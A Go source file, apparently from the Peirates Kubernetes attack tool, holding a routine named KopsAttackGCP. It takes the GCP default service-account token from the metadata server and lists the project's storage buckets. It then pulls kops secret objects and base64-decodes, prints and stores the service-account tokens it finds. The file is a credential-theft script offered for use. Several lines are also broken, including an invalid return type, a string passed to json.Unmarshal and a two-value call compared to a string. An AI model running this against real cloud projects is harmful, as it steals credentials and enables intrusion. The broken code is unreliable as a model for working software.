package peirates

import (
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"strings"
	"time"
)

// Tokens returned by the metadata API will look like this, unless error has occurred: {"access_token":"xxxxxxx","expires_in":2511,"token_type":"Bearer"}

type GCPToken struct {
	Token string `json:"access_token"`
	Expires int `json:"expires_in"`
	ExpirationTime time.Time
	Type string `json:"token_type"`
}
	
	
// GetGCPBearerTokenFromMetadataAPI takes the name of a GCP service account and returns a token
func GetGCPBearerTokenFromMetadataAPI(account string) (string, err) {

	headers := []HeaderLine{
		HeaderLine{"Metadata-Flavor", "Google"},
	}
	baseURL := "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/" 
	urlSvcAccount := baseURL + account + "/token"

	reqTokenRaw := GetRequest(urlSvcAccount, headers, false)

	// TODO: Add a check for a 200 status code
	if (reqTokenRaw == "") || (strings.HasPrefix(reqTokenRaw, "ERROR:")) {
		errorString := "[-] Error - could not perform request for " + urlSvcAccount
		println(errorString)
		return "", errors.New(errorString)
	}

	var token GCPToken
	err := json.Unmarshal(reqTokenRaw, &token)
	if err != nil {
		return "",err
	}
	
	
	if token.Type == "Bearer" {
		returnStr := fmt.Sprintf("%s --- expiring in approx %d seconds ", token.Token, token.Expires)
		return returnStr, nil
	} else {	
		errorStr := "[-] Error - could not find token in returned body text: " + string(reqTokenRaw) 
		println(errorStr)
		return "", errors.New(errorStr)
	}
}

func KopsAttackGCP() (serviceAccountsToReturn []ServiceAccount, err error) {
	var storeTokens string
	var placeTokensInStore bool

	println("[1] Store all tokens found in Peirates data store")
	println("[2] Retrieve all tokens - I will copy and paste")
	fmt.Scanln(&storeTokens)
	storeTokens = strings.TrimSpace(storeTokens)

	if storeTokens == "1" {
		placeTokensInStore = true
	}

	token := GetGCPBearerTokenFromMetadataAPI("default")
	if token == "ERROR" {
		msg := "[-] Could not get GCP default token from metadata API"
		println(msg)
		return nil, errors.New(msg)
	} else {
		println("[+] Got default token for GCP - preparing to use it for GCS:", token)
	}

	// Need to get project ID from metadata API
	var headers []HeaderLine
	headers = []HeaderLine{
		HeaderLine{"Metadata-Flavor", "Google"},
	}
	projectID := GetRequest("http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id", headers, false)
	if (projectID == "") || (strings.HasPrefix(projectID, "ERROR:")) {
		msg := "[-] Could not get GCP project from metadata API"
		println(msg)
		return nil, errors.New(msg)
	}
	println("[+] Got numberic project ID", projectID)

	// Get a list of buckets, maintaining the same header and adding two lines
	headers = []HeaderLine{
		HeaderLine{"Authorization", "Bearer " + token},
		HeaderLine{"Accept", "json"},
		HeaderLine{"Metadata-Flavor", "Google"}}

	// curl -s -H 'Metadata-Flavor: Google' -H "Authorization: Bearer $(cat bearertoken)" -H "Accept: json" https://www.googleapis.com/storage/v1/b/?project=$(cat projectid)
	urlListBuckets := "https://www.googleapis.com/storage/v1/b/?project=" + projectID
	bucketListRaw := GetRequest(urlListBuckets, headers, false)
	if (bucketListRaw == "") || (strings.HasPrefix(bucketListRaw, "ERROR:")) {
		msg := "[-] blank bucket list or error retriving bucket list"
		println(msg)
		return nil, errors.New(msg)
	}
	bucketListLines := strings.Split(string(bucketListRaw), "\n")

	// Build our list of bucket URLs
	var bucketUrls []string
	for _, line := range bucketListLines {
		if strings.Contains(line, "selfLink") {
			url := strings.Split(line, "\"")[3]
			bucketUrls = append(bucketUrls, url)
		}
	}

	// In every bucket URL, look at the objects
	// Each bucket has a self-link line.  For each one, run that self-link line with /o appended to get an object list.
	// We use the same headers[] from the previous GET request.
eachbucket:
	for _, line := range bucketUrls {
		println("Checking bucket for credentials:", line)
		urlListObjects := line + "/o"
		bodyListObjects := GetRequest(urlListObjects, headers, false)
		if (bodyListObjects == "") || (strings.HasPrefix(bodyListObjects, "ERROR:")) {
			continue
		}
		objectListLines := strings.Split(string(bodyListObjects), "\n")

		// Run through the object data, finding selfLink lines with URL-encoded /secrets/ in them.
		for _, line := range objectListLines {
			if strings.Contains(line, "selfLink") {
				if strings.Contains(line, "%2Fsecrets%2F") {
					objectURL := strings.Split(line, "\"")[3]
					// Find the substring that tells us this service account token's name
					start := strings.LastIndex(objectURL, "%2F") + 3
					serviceAccountName := objectURL[start:]
					println("\n[+] Getting service account for:", serviceAccountName)

					// Get the contents of the bucket to get the service account token
					saTokenURL := objectURL + "?alt=media"

					// We use the same headers[] from the previous GET request.
					bodyToken := GetRequest(saTokenURL, headers, false)
					if (bodyToken == "") || (strings.HasPrefix(bodyToken, "ERROR:")) {
						continue eachbucket
					}
					tokenLines := strings.Split(string(bodyToken), "\n")
					// TODO: Do we need to check status code?  if respToken.StatusCode != 200 {

					//					var serviceAccountsToReturn []ServiceAccount
					for _, line := range tokenLines {
						// Now parse this line to get the token
						encodedToken := strings.Split(line, "\"")[3]
						token, err := base64.StdEncoding.DecodeString(encodedToken)
						if err != nil {
							println("[-] Could not decode token.")
						} else {
							tokenString := string(token)
							println(tokenString)

							if placeTokensInStore {
								tokenName := "GCS-acquired: " + string(serviceAccountName)
								println("[+] Storing token as:", tokenName)
								serviceAccount := MakeNewServiceAccount(tokenName, tokenString, "GCS Bucket")
								serviceAccountsToReturn = append(serviceAccountsToReturn, serviceAccount)

							}
						}

					}

				}
			}
		}
	}

	//
	// Don't forget to base64 decode with base64.StdEncoding.DecodeString()
	return serviceAccountsToReturn, nil

}
